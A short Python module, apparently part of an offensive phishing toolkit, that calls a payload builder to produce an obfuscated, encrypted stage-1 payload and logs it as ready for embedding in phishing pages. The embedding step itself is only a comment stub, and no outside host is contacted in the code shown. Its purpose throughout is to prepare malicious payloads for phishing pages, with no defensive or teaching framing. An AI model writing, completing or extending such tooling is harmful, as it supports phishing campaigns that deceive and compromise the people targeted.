"""
Phishing payload embedder module
Embeds payloads into phishing pages
"""

from core.logger import Logger
from core.payload_builder import PayloadBuilder


def run():
    """Run the payload embedder"""
    logger = Logger()
    payload_builder = PayloadBuilder()
    
    logger.log("Generating payload for embedding...", "info")
    
    # Generate payload
    payload = payload_builder.build_payload(
        stage=1,
        obfuscate=True,
        encrypt=True
    )
    
    # Embed payload into phishing template
    # This would integrate with the Go template engine
    logger.log(f"Payload generated: {len(payload)} bytes", "info")
    logger.log("Payload ready for embedding in phishing pages", "info")
    
    return payload

